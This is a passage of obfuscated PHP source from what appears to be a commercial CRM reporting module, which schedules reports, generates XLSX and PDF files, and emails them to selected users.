date("Y-m-d ",$ZZZZZZZZZZZZZZZZZy24);$ZZZZZZZZZZZZZZZZZD33 = $ZZZZZZZZZZZZo14.$ZZZZZZZZZZZZZZZZZo14.":00";$ZZZZZZZZZZZZZZZZZE44 = date_default_timezone_get();date_default_timezone_set($ZZZZZZO1414);$ZZZZZZZZZZZZc2 = strtotime($ZZZZZZZZZZZZZZZZZD33);date_default_timezone_set($ZZZZZZZZZZZZZZZZZE44);return date("Y-m-d H:i:s",$ZZZZZZZZZZZZc2);} function ZZZZZZZZZZZZZZZZZG66($id,$ZZZZZZZZZZZZZZZZZv21,$ZZZZZZZZZZZZZZZZZH77,$ZZZZZZZZZZZZZZZZZI88,$ZZZZZZZZZZZZZZZZZJ99,$ZZZF55,$ZZZZZZZZZZZZZZZZZK1010){$ZZZZW2222 = new User();$ZZZZW2222->retrieve((int)$ZZZF55);$ZZZZZZZZZZZZZZZZZK1010 = json_decode($ZZZZZZZZZZZZZZZZZK1010);if(is_a($ZZZZZZZZZZZZZZZZZK1010,"stdClass") && (property_exists($ZZZZZZZZZZZZZZZZZK1010,"xlsx") || property_exists($ZZZZZZZZZZZZZZZZZK1010,"pdf") || property_exists($ZZZZZZZZZZZZZZZZZK1010,"url"))){$ZZZZZZZZZZZZZZZZZK1010 = json_encode($ZZZZZZZZZZZZZZZZZK1010);}else{$ZZZZZZZZZZZZZZZZZK1010 = "";} $ZZZZZZZZZZZZZZZZZL1111 = TimeDate::userTimezone($ZZZZW2222);$ZZZZZZZZZZZZZZZZZo14 = $ZZZZZZZZZZZZZZZZZH77.":".$ZZZZZZZZZZZZZZZZZI88;$ZZZJ99 = "";if($ZZZZZZZZZZZZZZZZZv21 == 1){$ZZZJ99 = (int)$ZZZZZZZZZZZZZZZZZJ99[0];}else if($ZZZZZZZZZZZZZZZZZv21 == 2){$ZZZJ99 = ((int)$ZZZZZZZZZZZZZZZZZJ99[0])."-".((int)$ZZZZZZZZZZZZZZZZZJ99[1]) ;}else if($ZZZZZZZZZZZZZZZZZv21 == 3){$ZZZJ99 = $ZZZZZZZZZZZZZZZZZJ99[1];}else if($ZZZZZZZZZZZZZZZZZv21 == 4){$ZZZJ99 = $ZZZZZZZZZZZZZZZZZJ99[0]."-".$ZZZZZZZZZZZZZZZZZJ99[1];} $ZZZZZZZZZZZZZZZZZM1212 = $this->ZZZZZZZZZZZZZZZZZu20($ZZZZZZZZZZZZZZZZZv21,$ZZZJ99,$ZZZZZZZZZZZZZZZZZo14,$ZZZZZZZZZZZZZZZZZL1111);if($ZZZZZZZZZZZZZZZZZM1212<date("Y-m-d H:i:s")){$ZZZZZZZZZZZZZZZZZM1212 = $this->ZZZZZZZZZZZZZZZZZF55($ZZZZZZZZZZZZZZZZZv21,$ZZZJ99,$ZZZZZZZZZZZZZZZZZo14,$ZZZZZZZZZZZZZZZZZL1111);} $this->db->ZZZA00("INSERT INTO advancedreports_schedule (`id`, `interval`, `interval_options`, `time`,`nexttime`, `formats`) VALUES(?,?,?,?,'$ZZZZZZZZZZZZZZZZZM1212',?) ON DUPLICATE KEY UPDATE `interval`=VALUES(`interval`), `interval_options`=VALUES(`interval_options`), `time`=VALUES(`time`), `formats`=VALUES(`formats`), `nexttime`='$ZZZZZZZZZZZZZZZZZM1212' ", array($id,$ZZZZZZZZZZZZZZZZZv21,$ZZZJ99,$ZZZZZZZZZZZZZZZZZo14,$ZZZZZZZZZZZZZZZZZK1010));}} ;class ZZZZZZZZZZo14{static private $ZZZZZZZZZZZZZZZZZZZ2525 = 'modules/AnalyticReporting/config';static private $ZZZZZZZZZZZZZZZZZZZa0 = array('reportBuilder' => array('common' => 'common', 'manyToMany' => 'manyToMany',), 'common' => array('common' => 'common'));static function load($type, $name){if(isset(ZZZZZZZZZZo14::$ZZZZZZZZZZZZZZZZZZZa0[$type][$name])){$ZZZZZZZZZZZZZZZZZZZb1 = ZZZZZZZZZZo14::$ZZZZZZZZZZZZZZZZZZZ2525."/".$type."/".$name;$ZZZZZZZZZZZZZZZZZZZc2 = $ZZZZZZZZZZZZZZZZZZZb1."Custom.php";$ZZZZZZZZZZZZZZZZZZZd3 = $ZZZZZZZZZZZZZZZZZZZb1."Default.php";if (file_exists($ZZZZZZZZZZZZZZZZZZZc2)){return include $ZZZZZZZZZZZZZZZZZZZc2;}elseif(file_exists($ZZZZZZZZZZZZZZZZZZZd3)){return include $ZZZZZZZZZZZZZZZZZZZd3;}} return false;} static function save($type, $name, $ZU2020){if(isset($ZZZZZZZZZZZZZZZZZZZa0[$type][$name])){$ZZZZZZZZZZZZZZZZZZZb1 = ZZZZZZZZZZo14::$ZZZZZZZZZZZZZZZZZZZ2525."/".$type."/".$name;$ZZZZZZZZZZZZZZZZZZZc2 = $ZZZZZZZZZZZZZZZZZZZb1."Custom.php";file_put_contents($ZZZZZZZZZZZZZZZZZZZc2, "<?"."php return " . var_export($ZU2020, true) . ";");return true;} return false;}}
;class ZZZZZZZZZZZZZZZZZZZe4
{public $ZZZZZZZZZZZZZZZZZZZf5 = array();public $ZZZZZZZZZZZZZZZZZZZg6 = false;function __construct() {set_time_limit(0);} function ZZZZZZZZZZZZZZZZZZZh7($url, $r17, $ZZZZZZZZZZZZZZZZZZZi8 = false) {$ZZZZZZZZZZZZZZZZZZZj9 = http_build_query($r17);$ZZZZZZZZZZZZZZZZZZZk10 = curl_init();curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_URL, $url);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_POST, true);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_POSTFIELDS, $ZZZZZZZZZZZZZZZZZZZj9);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_VERBOSE, 1);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_HEADER, 1);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_BINARYTRANSFER, 1);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_RETURNTRANSFER, 1);$ZZZZZZZZZZZZZZZZZP1515 = curl_exec($ZZZZZZZZZZZZZZZZZZZk10);$this->ZZZZZZZZZZZZZZZZZZZf5[] = curl_error($ZZZZZZZZZZZZZZZZZZZk10);$ZZZZZZZZZZZZZZZZZZZl11 = curl_getinfo($ZZZZZZZZZZZZZZZZZZZk10, CURLINFO_HEADER_SIZE);curl_close ($ZZZZZZZZZZZZZZZZZZZk10);$ZZZZZZZZZZZZZZZZZZZm12 = substr($ZZZZZZZZZZZZZZZZZP1515, 0, $ZZZZZZZZZZZZZZZZZZZl11);$ZZZZZZZZZZZZZZZZZZZn13 = substr($ZZZZZZZZZZZZZZZZZP1515, $ZZZZZZZZZZZZZZZZZZZl11);$ZZZZZZZZZZZZZZZZZZZo14 = explode("\n", $ZZZZZZZZZZZZZZZZZZZm12);foreach($ZZZZZZZZZZZZZZZZZZZo14 as $ZZZZZZZZZZZZZZZZZZZp15) {$ZZZZZZZZZZZZZZZZZZZq16 = explode(':', $ZZZZZZZZZZZZZZZZZZZp15);if(count($ZZZZZZZZZZZZZZZZZZZq16) == 2) {$ZZZZZZZZZZZZZZZZZZZr17[$ZZZZZZZZZZZZZZZZZZZq16[0]] = trim($ZZZZZZZZZZZZZZZZZZZq16[1]);}} if($ZZZZZZZZZZZZZZZZZZZi8) {return $ZZZZZZZZZZZZZZZZZZZn13;} header('Content-type: ' . $ZZZZZZZZZZZZZZZZZZZr17['Content-Type']);header('Content-Disposition: ' . $ZZZZZZZZZZZZZZZZZZZr17['Content-Disposition']);echo $ZZZZZZZZZZZZZZZZZZZn13;} function retrieve($url, $ZZZZZZZZZZZZZZZZZZZs18 = true, $ZZZZZZZZZZZZZZZZZZZt19 = false) {$ZZZZZZZZZZZZZZZZZZZk10 = curl_init();curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_URL, $url);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_TIMEOUT, 50);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_FAILONERROR, true);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_FOLLOWLOCATION, true);if($ZZZZZZZZZZZZZZZZZZZt19) {curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_NOPROGRESS, false);curl_setopt($ZZZZZZZZZZZZZZZZZZZk10, CURLOPT_PROGRESSFUNCTION, $ZZZZZZZZZZZZZZZZZZZt19);} $ZZZZZZZZZZZZZZZZZP1515 = curl_exec($ZZZZZZZZZZZZZZZZZZZk10);$this->ZZZZZZZZZZZZZZZZZZZf5[] = curl_error($ZZZZZZZZZZZZZZZZZZZk10);curl_close($ZZZZZZZZZZZZZZZZZZZk10);if($ZZZZZZZZZZZZZZZZZZZs18) {return json_decode($ZZZZZZZZZZZZZZZZZP1515, true);} return $ZZZZZZZZZZZZZZZZZP1515;}}
;function sendScheduledReports() {$adb = DBManagerFactory::getInstance();$db = new ZZp15($adb);$ZZZZS1818 = new ZZZZT1919();$ZZZZZZZZZZZZZZZZZZZZO1414 = new ZZZZZZZZZZZZZZZZZZZZP1515($db, $ZZZZS1818);$ZZZZZZZZZZZZZZZZZZZZO1414->sendScheduledReports();return true;} class ZZZZZZZZZZZZZZZZZZZZP1515{const ZZZZZZZZZZZZZZZZZZZZQ1616 = 0;const ZZZZZZZZZZZZZZZZZZZZR1717 = 1;const ZZZZZZZZZZZZZZZZZZZZS1818 = 2;const ZZZZZZZZZZZZZZZZZZZZT1919 = 3;const ZZZZZZZZZZZZZZZZZZZZU2020 = 4;protected $db;protected $ZZZZS1818;function __construct($db,$ZZZZS1818){$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;} protected $ZZZZZZZZZZZZZZZZZx23 = array("Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday");function ZZZZZZZZZZZZZZZZZF55($ZZZZZZZZZZZZZZZZZv21,$ZZZZZZZZZZZZZZZZZw22,$ZZZZZZZZZZZZZZZZZo14,$ZZZZZZO1414){switch($ZZZZZZZZZZZZZZZZZv21){case self::ZZZZZZZZZZZZZZZZZZZZR1717: $ZZZZZZZZZZZZZZZZZy24 = strtotime("next ".$this->ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22]);break;case self::ZZZZZZZZZZZZZZZZZZZZS1818: $ZZZZZZZZZZZZZZZZZw22 = explode("-",$ZZZZZZZZZZZZZZZZZw22,2);if($ZZZZZZZZZZZZZZZZZw22[1] == 0){$ZZZZZZZZZZZZZZZZZz25 = "first";$ZZZZZZZZZZZZZZZZZA00 = "third";}else{$ZZZZZZZZZZZZZZZZZz25 = "second";$ZZZZZZZZZZZZZZZZZA00 = "fourth";} $ZZZZZZZZZZZZZZZZZB11 = date("Y-m-d");$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZZZZZZZZZZZZZZZA00." ".$this->ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22[0]]." of this month");if($ZZZZZZZZZZZZZZZZZB11>=date("Y-m-d",$ZZZZZZZZZZZZZZZZZy24)){$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZZZZZZZZZZZZZZZz25." ".$this->ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22[0]]." of next month");} break;case self::ZZZZZZZZZZZZZZZZZZZZT1919: $ZZZz25 = date("Y-m-d",strtotime("+1 month"));$ZZZz25 = preg_replace('/[0-9][0-9]$/',$ZZZZZZZZZZZZZZZZZw22,$ZZZz25);$ZZZZZZZZZZZZZZZZZC22 = date('Y-m-d', strtotime('last day of next month'));if($ZZZz25>$ZZZZZZZZZZZZZZZZZC22){$ZZZz25 = $ZZZZZZZZZZZZZZZZZC22;} $ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZz25);break;case self::ZZZZZZZZZZZZZZZZZZZZU2020: $ZZZZZZZZZZZB11 = ((int)date("Y") + 1);$ZZZz25 = $ZZZZZZZZZZZB11."-".$ZZZZZZZZZZZZZZZZZw22;$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZz25);break;case self::ZZZZZZZZZZZZZZZZZZZZQ1616: default: $ZZZZZZZZZZZZZZZZZy24 = strtotime("+1 day");break;} $ZZZZZZZZZZZZo14 = date("Y-m-d ",$ZZZZZZZZZZZZZZZZZy24);$ZZZZZZZZZZZZZZZZZD33 = $ZZZZZZZZZZZZo14.$ZZZZZZZZZZZZZZZZZo14.":00";$ZZZZZZZZZZZZZZZZZE44 = date_default_timezone_get();date_default_timezone_set($ZZZZZZO1414);$ZZZZZZZZZZZZc2 = strtotime($ZZZZZZZZZZZZZZZZZD33);date_default_timezone_set($ZZZZZZZZZZZZZZZZZE44);return date("Y-m-d H:i:s",$ZZZZZZZZZZZZc2);} function ZZZZZZZZZZZZZZZZZZZZV2121(){$ZZS1818 = $this->db->ZZZu20("SELECT s.`id`,s.`interval`,s.`interval_options`,s.`time`, s.`formats`, r.* FROM advancedreports_schedule s INNER JOIN `advancedreports` r ON r.id=s.id WHERE `nexttime` <='".date("Y-m-d H:i:s")."'");return $ZZS1818;} function ZZZZZZZZZZZZZZZZZZZZW2222($report){$ZZZZZZZZZZZZZZZZZZZZX2323 = array();$ZZZZA00 = $this->db->ZZZu20("SELECT `user` FROM advancedreports_schedule_u u WHERE u.id =".((int)$report['id']));$ZZT1919 = count($ZZZZA00);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZZZZZX2323[] = $ZZZZA00[$Zf5]["user"];} $ZZZZE44 = $this->db->ZZZu20("SELECT `role` FROM advancedreports_schedule_r r WHERE r.id =".((int)$report['id']));$ZZT1919 = count($ZZZZE44);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZj9 = $this->ZZZZS1818->getRoleUsers($ZZZZE44[$Zf5]["role"], $this->db);$ZZZZZZZZZZZZZZZZZZZZX2323 = array_merge($ZZZZZZZZZZZZZZZZZZZZX2323,$ZZZZZj9);} $ZZZZZZZZZZZZZZZZZZZZX2323 = array_unique($ZZZZZZZZZZZZZZZZZZZZX2323);$ZZq16 = "SELECT TRIM(CONCAT(IFNULL(`first_name`, ''), ' ', IFNULL(`last_name`, ''))) AS `name`, `emails`.`email_address` AS `email` FROM `users` `u` INNER JOIN `email_addr_bean_rel` AS `emails_rel` ON (`emails_rel`.`bean_module` = 'Users' AND `emails_rel`.`bean_id` = `u`.`id` AND `emails_rel`.`primary_address` = 1 AND `emails_rel`.`deleted` = 0) INNER JOIN `email_addresses` AS `emails` ON (`emails`.`id` = `emails_rel`.`email_address_id` AND `emails`.`deleted` = 0) WHERE `u`.`id` IN (".implode(",",$this->db->ZZK1010($ZZZZZZZZZZZZZZZZZZZZX2323)).") AND `u`.`status`='Active' ";$ZZS1818 = $this->db->ZZZu20($ZZq16);return $ZZS1818;} function ZZZZZZZZZZZZZZZZZZZZY2424($ZZZZZZZZZZZZZZZZZZn13){$ZZZZZZZZZZZZZD33 = PlatformConnector::ZZZZZZe4($ZZZZZZZZZZZZZZZZZZn13["owner"]);$ZZZZZZZZZZZZZZZZZZn13["related_data"] = json_decode($ZZZZZZZZZZZZZZZZZZn13["related_data"]);$ZZZJ99 = json_decode($ZZZZZZZZZZZZZZZZZZn13["options"]);if(!isset($ZZZJ99->isCombined)){$ZZZJ99->isCombined = false;} $ZZZK1010 = json_decode($ZZZZZZZZZZZZZZZZZZn13["labels"], true);if($ZZZJ99->isCombined){$module = null;$ZZZZZZZZZZZZZZZZZZo14 = new ZZZZZZZZZZZZZZ2525($this->db, $this->ZZZZS1818, $ZZZK1010);}else{$module = new ZZZZZZZZZZx23($ZZZZZZZZZZZZZZZZZZn13["module"],$this->db,$this->ZZZZS1818);$ZZZZZZZZZZZZZZZZZZo14 = new ZZZZZZZZZZZZZv21($this->db, $this->ZZZZS1818, $ZZZK1010);} $ZZZZZZZZZZZZZZZZZZp15 = array();$ZZT1919 = count($ZZZZZZZZZZZZZZZZZZn13["related_data"]);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZZZp15[] = new ZZZZZZZZZZu20($ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][0], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][1], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][2], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][3], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][4], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][5], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][6], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][7], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][8], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][9], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][10], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][11]);} if(!isset($ZZZJ99->aggregateColumn)){$ZZZJ99->aggregateColumn = false;} $r17 = $ZZZZZZZZZZZZZZZZZZo14->ZZZZZZZZZZZZZA00($module, json_decode($ZZZZZZZZZZZZZZZZZZn13['fields']), json_decode($ZZZZZZZZZZZZZZZZZZn13['filters']), $ZZZZZZZZZZZZZZZZZZp15, json_decode($ZZZZZZZZZZZZZZZZZZn13['grouping'],true), json_decode($ZZZZZZZZZZZZZZZZZZn13['aggregates'],true), !$ZZZJ99->includeDetails, $ZZZJ99->isCrosstab, false, $ZZZJ99->aggregateColumn, "yyyy-mm-dd", false, isset($ZZZZZZZZZZZZZZZZZZn13['calcFields']) ? json_decode($ZZZZZZZZZZZZZZZZZZn13['calcFields'], true) : array(), array(), $ZZZZZZZZZZZZZD33);$ZZZZZZZZZZZZZZE44 = array_keys($r17["cols"]);$ZZS1818 = array();$ZZS1818[] = array_values($r17["cols"]);$ZZT1919 = count($ZZZZZZZZZZZZZZE44);$ZZZZZZZZZZZZZZs18 = count($r17["data"]);for($Zf5 = 0;$Zf5<$ZZZZZZZZZZZZZZs18;$Zf5++){$ZZZz25 = array();for($ZZZZZK1010 = 0;$ZZZZZK1010<$ZZT1919;$ZZZZZK1010++){$ZZZz25[] = (isset($r17["data"][$Zf5][$ZZZZZZZZZZZZZZE44[$ZZZZZK1010]]))?($r17["data"][$Zf5][$ZZZZZZZZZZZZZZE44[$ZZZZZK1010]]):("");} $ZZS1818[] = $ZZZz25;} $ZZZZZZZZZZZZZZZZZZQ1616 = new PHPExcel();$ZZZZZZZZZZZZZZZZZZQ1616->getProperties()->setCreator("Advanced Reporting For vTiger") ->setLastModifiedBy("ITSAPIENS.EU") ->setTitle("REPORT") ->setSubject("REPORT") ->setDescription("REPORT");$ZZZZZZZZZZZZZZZZZZR1717 = $ZZZZZZZZZZZZZZZZZZQ1616->getActiveSheet();$ZZZZZZZZZZZZZZZZZZR1717->fromArray($ZZS1818);$ZZZZZZZZZZZZZZZZZZZZq16 = PHPExcel_IOFactory::createWriter($ZZZZZZZZZZZZZZZZZZQ1616, 'Excel2007');$S1818 = 'upload/AnalyticReporting_'.preg_replace('/[^a-zA-Z0-9_-\s]/', '', $ZZZZZZZZZZZZZZZZZZn13["title"]).'_'.time().".xlsx";$ZZZZZZZZZZZZZZZZZZZZq16->save($S1818);return $S1818;} function ZZZZZZZZZZZZZZZZZZZZZ2525($ZZZZZZZZZZZZZZZZZZn13){$ZZZJ99 = json_decode($ZZZZZZZZZZZZZZZZZZn13["options"]);unset($_REQUEST["combined"]);if(isset($ZZZJ99->isCombined) && $ZZZJ99->isCombined == true){$_REQUEST["combined"] = 1;} $ZZZZZZZZZZZv21 = PlatformConnector::ZZZZZZz25();$_REQUEST['file'] = 'makePDF';$r17 = retrieveData($this->db,true,$ZZZZZZZZZZZZZZZZZZn13);global $current_user;$ZZZZZZZZZZZZZZZZZZm12 = true;$ZZZZZZZZZZZZZZZZZZI88 = $this->ZZZZS1818->ZZZZX2323($current_user);$ZZZZZZZZZZZZZZZZZZJ99 = $ZZZZZZZZZZZZZZZZZZI88['decimal'];$ZZZZZZZZZZZZZZZZZZK1010 = $ZZZZZZZZZZZZZZZZZZI88['seperator'];$ZZZJ99 = ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["options"]):json_decode($_POST["options"]);if(empty($ZZZZZZZZZZZZZZZZZZn13["labels"])) {$ZZZZZZZZZZZZZZZZZZn13["labels"] = "[]";} $ZZZK1010 = ($ZZZZZZZZZZZZZZZZZZm12)? json_decode($ZZZZZZZZZZZZZZZZZZn13["labels"], true):json_decode($_POST["labels"], true);$ZZZI88 = ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["totalAggregates"],true):json_decode($_POST["totalAggregates"],true);$ZZZZZZZZZZZZZZZZZZZZi8 = array();foreach ($ZZZI88 as $Zu20 => $value) {foreach ($value as $ZZZZZZZZZZZZZZZZZZZZj9 => $ZZZZZZZZZZZZZZZZZZZZk10) {if($ZZZZZZZZZZZZZZZZZZZZk10) $ZZZZZZZZZZZZZZZZZZZZi8[] = $Zu20.($ZZZZZZZZZZZZZZZZZZZZj9=='count'?'_cnt':'_sum');}} $ZZZZZZZZZZZZZZZZZZZZl11 = "Grand Total";if(isset($ZZZK1010["grandTotal"])) {$ZZZZZZZZZZZZZZZZZZZZl11 = $ZZZK1010["grandTotal"];} if(count($ZZZZZZZZZZZZZZZZZZZZi8) > 0 && !$ZZZJ99->aggregateColumn && !$ZZZJ99->isCrosstab){$ZZZZZZZZZZZZZZZZZZZZm12 = array();foreach ($r17['data'] as $Zu20 => $value) {foreach ($value as $ZZZZZZZZZZZZZZZZZZZZn13 => $ZZZZZZZZZZZZZZZZZZZZo14) {if(!isset($ZZZZZZZZZZZZZZZZZZZZm12[$ZZZZZZZZZZZZZZZZZZZZn13])){$ZZZZZZZZZZZZZZZZZZZZm12[$ZZZZZZZZZZZZZZZZZZZZn13] = 0;} if(substr($ZZZZZZZZZZZZZZZZZZZZo14, 0, 10) != "<SubTotal>" && (preg_match('/^\d+\.\d+$/', $ZZZZZZZZZZZZZZZZZZZZo14) || is_numeric($ZZZZZZZZZZZZZZZZZZZZo14)) && substr($ZZZZZZZZZZZZZZZZZZZZn13, -4) != "_avg" && (in_array(preg_replace('/[v]\d[_]/', '', $ZZZZZZZZZZZZZZZZZZZZn13), $ZZZZZZZZZZZZZZZZZZZZi8) || in_array(preg_replace('/[v]\d[_]/', '', $ZZZZZZZZZZZZZZZZZZZZn13)."_sum", $ZZZZZZZZZZZZZZZZZZZZi8))){$ZZZZZZZZZZZZZZZZZZZZm12[$ZZZZZZZZZZZZZZZZZZZZn13] = number_format($ZZZZZZZZZZZZZZZZZZZZm12[$ZZZZZZZZZZZZZZZZZZZZn13]+$ZZZZZZZZZZZZZZZZZZZZo14,$ZZZZZZZZZZZv21,".","");}elseif(substr($ZZZZZZZZZZZZZZZZZZZZo14, 0, 10) != "<SubTotal>" && in_array(preg_replace('/[v]\d[_]/', '', $ZZZZZZZZZZZZZZZZZZZZn13)."_cnt", $ZZZZZZZZZZZZZZZZZZZZi8) && !preg_match('/^\d+\.\d+$/', $ZZZZZZZZZZZZZZZZZZZZo14) && !is_numeric($ZZZZZZZZZZZZZZZZZZZZo14)) {$ZZZZZZZZZZZZZZZZZZZZm12[$ZZZZZZZZZZZZZZZZZZZZn13]++;}}} $ZZZZZZZZZZZZZZZZZZZZm12[key($r17["cols"])] = $ZZZZZZZZZZZZZZZZZZZZl11;$r17['data'][] = $ZZZZZZZZZZZZZZZZZZZZm12;}elseif($ZZZJ99->aggregateColumn && !$ZZZJ99->isCrosstab) {$ZZZZZZZZZZZZZZZZZZZZm12 = array();foreach ($r17['data'] as $Zu20 => $value) {$r17['data'][$Zu20]["grand_total"] = 0;foreach ($value as $ZZZZZZZZZZZZZZZZZZZZn13 => $ZZZZZZZZZZZZZZZZZZZZo14) {if(preg_match('/[v]\d[_]/', $ZZZZZZZZZZZZZZZZZZZZn13)) $r17['data'][$Zu20]["grand_total"] += $ZZZZZZZZZZZZZZZZZZZZo14;}} $r17["cols"]["grand_total"] = $ZZZZZZZZZZZZZZZZZZZZl11;} foreach ($r17['data'] as $Zu20 => $value) {foreach ($value as $ZZZZZZZZZZZZZZZZZZZZn13 => $ZZZZZZZZZZZZZZZZZZZZo14) {if(!isset($r17['pdffields'][$ZZZZZZZZZZZZZZZZZZZZn13])) {continue;} if($r17['pdffields'][$ZZZZZZZZZZZZZZZZZZZZn13]=='txt'){continue;} if(is_numeric($ZZZZZZZZZZZZZZZZZZZZo14) && substr($ZZZZZZZZZZZZZZZZZZZZn13, -4) != "_cnt" && !in_array($ZZZZZZZZZZZZZZZZZZZZn13."_cnt", $ZZZZZZZZZZZZZZZZZZZZi8)){$r17['data'][$Zu20][$ZZZZZZZZZZZZZZZZZZZZn13] = number_format($ZZZZZZZZZZZZZZZZZZZZo14,$ZZZZZZZZZZZv21,$ZZZZZZZZZZZZZZZZZZJ99,$ZZZZZZZZZZZZZZZZZZK1010);}elseif(is_numeric($ZZZZZZZZZZZZZZZZZZZZo14)){$r17['data'][$Zu20][$ZZZZZZZZZZZZZZZZZZZZn13] = number_format($ZZZZZZZZZZZZZZZZZZZZo14,0,$ZZZZZZZZZZZZZZZZZZJ99,$ZZZZZZZZZZZZZZZZZZK1010);}}} $ZZZZZZZZZZZd3 = array_keys($r17["cols"]);$ZZZZZZZZZZZZZZZZZZT1919 = count($ZZZZZZZZZZZd3);$ZZZZZZZZZZZZZZZZZZU2020 = ZZZZZZZZZZZZZZZZZZS1818($r17);$ZZZZZZZZZZZZZZZZZZW2222 = $ZZZZZZZZZZZZZZZZZZT1919 * 70;list($ZZZZZZZZZZZZZZZZZZX2323,$ZZZZZZZZZZZZZZZZZZY2424) = ZZZZZZZZZZZZZZZZZZV2121($ZZZZZZZZZZZZZZZZZZW2222);ini_set("memory_limit","512M");require_once('modules/AnalyticReporting/lib/tcpdf/tcpdf.php');$pdf = new TCPDF($ZZZZZZZZZZZZZZZZZZX2323, "mm", $ZZZZZZZZZZZZZZZZZZY2424, true, 'UTF-8', false);$pdf = new TCPDF($ZZZZZZZZZZZZZZZZZZX2323, "mm", $ZZZZZZZZZZZZZZZZZZY2424, true, 'UTF-8', false);$pdf->SetCreator("IT Sapiens");$pdf->SetAuthor('IT Sapiens');$pdf->SetTitle($r17["title"]);$pdf->SetSubject($r17["title"]);$pdf->SetKeywords('Report');$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);$pdf->setFontSubsetting(true);$pdf->SetFont('arialunicode', '', 9, '', true);unset($r17);$pdf->AddPage();$pdf->writeHTMLCell(0, 0, '', '', $ZZZZZZZZZZZZZZZZZZU2020, 0, 1, 0, true, '', true);$S1818 = 'upload/AnalyticReporting_'.preg_replace('/[^a-zA-Z0-9_-\s]/', '', $ZZZZZZZZZZZZZZZZZZn13["title"]).'_'.time().".pdf";$pdf->Output($S1818, 'F');return $S1818;} function ZZZZZZZZZZZZZZZZZZZZZa0(){global $current_user;return $current_user->email1;} function ZZZZZZZZZZZZZZZZZZZZZb1($report,$ZZZZZZZZZZZZZZZZZZZZZc2){$ZZZZW2222 = new User();$ZZZZW2222->retrieve($report["owner"]);$ZZZZZZZZZZZZZZZZZZZZZd3 = TimeDate::userTimezone($ZZZZW2222);$ZZZZZZZZZZZZZZZZZL1111 = date_default_timezone_get();date_default_timezone_set($ZZZZZZZZZZZZZZZZZZZZZd3);$ZZZZZZZZZZZZZZZZZZZZZe4 = new TimeDate($ZZZZW2222);$ZZZZZZZZZZZZZZZZZZZZZf5 = $ZZZZZZZZZZZZZZZZZZZZZe4->get_time_format();$dateFormat = $ZZZZZZZZZZZZZZZZZZZZZe4->get_date_format();$ZZS1818 = array("subject"=>"[Report] ".$report["title"]." ".date($dateFormat." ".$ZZZZZZZZZZZZZZZZZZZZZf5), "body" =>$report["description"],);date_default_timezone_set($ZZZZZZZZZZZZZZZZZL1111);if($ZZZZZZZZZZZZZZZZZZZZZc2){global $sugar_config;$ZZS1818["body"].= "\n<br><a href=\"".$sugar_config['site_url']."/index.php?module=AnalyticReporting&action=report&record=".$report["id"]."\">".$report["title"]."</a>";} return $ZZS1818;} function ZZZZZZZZZZZZZZZZZZZZZg6($report){$ZZZZZZZZZZZZZZZZZZZZZh7 = array();if(!empty($report["formats"])){$ZZZZZZZZZZZZZZZZZK1010 = json_decode($report["formats"]);}else{$ZZZZZZZZZZZZZZZZZK1010 = json_decode('{"xlsx":true,"pdf":true,"url":true}');} $ZZZZZZO1414 = date_default_timezone_get();if($ZZZZZZZZZZZZZZZZZK1010->xlsx){$ZZZZZZZZZZZZZZZZZZZZZh7["Report.xlsx"] = $this->ZZZZZZZZZZZZZZZZZZZZY2424($report);} if($ZZZZZZZZZZZZZZZZZK1010->pdf){$ZZZZZZZZZZZZZZZZZZZZZh7["Report.pdf"] = $this->ZZZZZZZZZZZZZZZZZZZZZ2525($report);} date_default_timezone_set($ZZZZZZO1414);$ZZZZZZZZZF55 = new Email();$ZZZZZZZZZZZZZZZZZZZZZi8 = $ZZZZZZZZZF55->getSystemDefaultEmail();$ZZZZZZZZZZZZZZZZZZZZZj9= 